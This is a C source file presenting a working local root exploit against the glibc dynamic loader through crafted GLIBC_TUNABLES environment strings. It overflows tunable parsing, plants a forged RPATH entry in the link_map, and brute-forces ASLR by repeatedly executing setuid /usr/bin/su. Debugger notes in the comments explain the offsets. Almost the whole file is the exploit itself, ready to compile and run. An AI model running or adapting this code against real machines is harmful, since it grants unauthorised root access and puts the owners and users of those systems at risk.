#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/resource.h>

#define ENV_NAME                "GLIBC_TUNABLES"
#define PAYLOAD_TUNABLE_NAME    "glibc.malloc.mxfast"
#define TUNABLE_NAME            "glibc.malloc.tcache_max"
#define RW_SECTION_SIZE         0xd10
#define PAYLOAD_SIZE            0x5f0
#define SIZE_DT_RPATH           0x10000

#ifdef NO_ASLR
#define DT_RPATH                "\x80\xee\xff\xff\xff\x7f"
#define BRUTE                   0
#else
#define DT_RPATH                "\x10\xf0\xff\xff\xfd\x7f"
#define BRUTE                   1
#endif


void
fill_rw_section(char rw_section_buffer[])
{
	sprintf(rw_section_buffer, "%s=%s=", ENV_NAME, TUNABLE_NAME);

	for (int i=strlen(rw_section_buffer); i<RW_SECTION_SIZE-1; i++)
	{
		rw_section_buffer[i] = 'A';
	}
	rw_section_buffer[RW_SECTION_SIZE - 1] = '\x00';
}

void
craft_payload(char payload[])
{
	sprintf(payload, "%s=%s=%s=", ENV_NAME, PAYLOAD_TUNABLE_NAME, PAYLOAD_TUNABLE_NAME);

	for (int i=strlen(payload); i<PAYLOAD_SIZE-1; i++)
	{
		payload[i] = 'A';
	}
	payload[PAYLOAD_SIZE - 1] = '\x00';

}

void
craft_clean_tunable(char tunable[])
{
	sprintf(tunable, "%s=%s=", ENV_NAME, TUNABLE_NAME);

	for (int i=strlen(tunable); i<PAYLOAD_SIZE + 0x20 -1; i++)
	{
		tunable[i] = 'A';
	}
	tunable[PAYLOAD_SIZE + 0x20 - 1] = '\x00';
}


int
main(){

	printf("=============================\n");
	printf("[+] Exploit by DiegoAltF4 [+]\n");
	printf("=============================\n");

	char rw_section_buffer [RW_SECTION_SIZE];
	char payload           [PAYLOAD_SIZE];
	char tunable           [PAYLOAD_SIZE + 0x20];
	char l_info_dt_rpath   [SIZE_DT_RPATH];
	char *argv[]           = {"/usr/bin/su","--help",NULL};
	char *envp[0x1000]     = {NULL};
	struct rlimit rlim     = {RLIM_INFINITY, RLIM_INFINITY};
	int i, pid, tries=0, wstatus;
	time_t time_before, time_after;


	if (setrlimit(RLIMIT_STACK, &rlim) < 0) {perror("setrlimit"); return 1;}
	////////////////////////////////////////////////////////////////////////


	fill_rw_section(rw_section_buffer);

	/*
		Payload size calculation:

		The link_map structure is 1160 bytes long.
	
		gef➤  p/x 0x00007ffff7fbbc40 - 0x00007ffff7fbb000
		$2 = 0xc40

		there is a difference of 0xc40 bytes from the start of our payload to the start of our structure

		>>> len("GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=")
		55

		>>> len("glibc.malloc.mxfast=")
		20

		55 + x + 20 + x + 20 = 0xc40

		x ~ 1520
	*/

	craft_payload(payload);

	craft_clean_tunable(tunable);


	for (i = 0; i < 0x1000 - 1; i++)
	{
		envp[i] = "";
	}


	for (i = 0; i < SIZE_DT_RPATH - 1; i += 8)
	{
		/*
			gef➤  x/s 0x0000555555554ff0 - 0x14
			0x555555554fdc: "\""
		*/
		*(unsigned long long *)(l_info_dt_rpath + i) = -0x14ULL; // offset to string \"

	}
	l_info_dt_rpath[SIZE_DT_RPATH - 1] = '\0';


	envp[0]           = rw_section_buffer; // the following allocations will be in a new mmap
	envp[1]           = payload;

	/*
		gef➤  ptype /ox *(struct link_map*)$rax
		offset      |    size   type = struct link_map {
		0x0000      |  0x0008     Elf64_Addr l_addr;
		0x0008      |  0x0008     char *l_name;
		0x0010      |  0x0008     Elf64_Dyn *l_ld;
		0x0018      |  0x0008     struct link_map *l_next;
		0x0020      |  0x0008     struct link_map *l_prev;
		0x0028      |  0x0008     struct link_map *l_real;
		0x0030      |  0x0008     Lmid_t l_ns;
		0x0038      |  0x0008     struct libname_list *l_libname;
		0x0040      |  0x0268     Elf64_Dyn *l_info[77];

		gef➤  p/x (8*15) + 0x0040
		$2 = 0xb8
	*/

	envp[0x65 + 0xb8] = DT_RPATH; // 0xb8 is the offset to field l_info[15] (RPATH)
	envp[0x4ed]       = tunable; // 0x65 + 1160 = 0x4ed


	for (i = 0; i < 0x30 - 1; i++)
	{
		envp[0xf00 + i] = l_info_dt_rpath;  
	}

	/*
		gef➤  x/gx 0x7fffffffeee0
		0x7fffffffeee0: 0xffffffecffffffff --> not aligned, must be shifted by 4 bytes
	*/

	envp[0xf00 + 0x30 - 1] = "AAAA"; // to align

	if (BRUTE == 0)
	{
		if (execve(argv[0], argv, envp) < 0) {perror("execve"); return 1;}
	}


	printf("\nStarting bruteforce ...\n\n");


	while (1)
	{
		if (tries % 100 == 0) printf("[%i]\n", tries);

		pid = fork();

		if (pid < 0) {perror("fork"); break;}

		else if (pid == 0)
		{
			if (execve(argv[0], argv, envp) < 0) {perror("execve");break;}
		}
		else
		{
			time(&time_before);
			wait(&wstatus);
			time(&time_after);
			if (!WIFSIGNALED(wstatus) && time_after - time_before > 1) {break;}
		}
		tries++;
	}

	return 0;
}
